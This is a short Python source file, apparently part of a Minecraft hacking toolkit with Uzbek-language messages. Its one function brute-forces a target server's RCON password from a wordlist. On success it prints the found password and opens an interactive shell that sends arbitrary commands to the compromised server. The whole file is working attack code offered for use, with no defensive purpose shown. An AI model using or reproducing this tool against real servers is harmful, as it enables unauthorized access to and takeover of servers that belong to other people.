from mcrcon import MCRcon
from plugins.common import *

def rconbrut(server, file):
    if checkserver(server) == False: logging.error('Iltimos, Real domen kiriting:'); return
    try:
        with open(file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        for password in passwords:
            try:
                with MCRcon(server, password) as mcr:
                    logging.success(f'Parol topildi! {password}')
                    logging.info('Chiqish uchun "chiqish" deb yozing')

                    while True:
                        rcmd = input(f'{red}/')
                        if rcmd == 'chiqish': mcr.disconnect(); return
                        resp = mcr.command(f"{rcmd}")
                        print(resp)

            except Exception:
                continue

        logging.error('Mos RCON password topilmadi.')

    except Exception as e:
        logging.error(str(e))
